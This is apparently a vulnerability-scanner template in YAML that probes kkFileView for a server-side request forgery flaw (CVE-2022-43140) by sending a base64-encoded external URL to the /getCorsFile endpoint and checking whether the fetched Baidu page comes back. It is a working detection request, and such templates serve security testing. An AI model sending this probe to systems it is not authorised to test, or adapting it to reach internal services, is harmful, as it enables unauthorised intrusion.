id: poc-yaml-kkfileview-getcorsfile-ssrf
info:
  name: kkFileView SSRF Vulnerability (CVE-2022-43140)
  author: ProjectDiscoveryAI
  severity: high
  tags: ssrf,CVE-2022-43140

variables:
  url: "{{base64('https://www.baidu.com')}}"

http:
  - raw:
      - |
        GET /getCorsFile?urlPath={{url}} HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "百度一下，你就知道"
          - "关于百度"
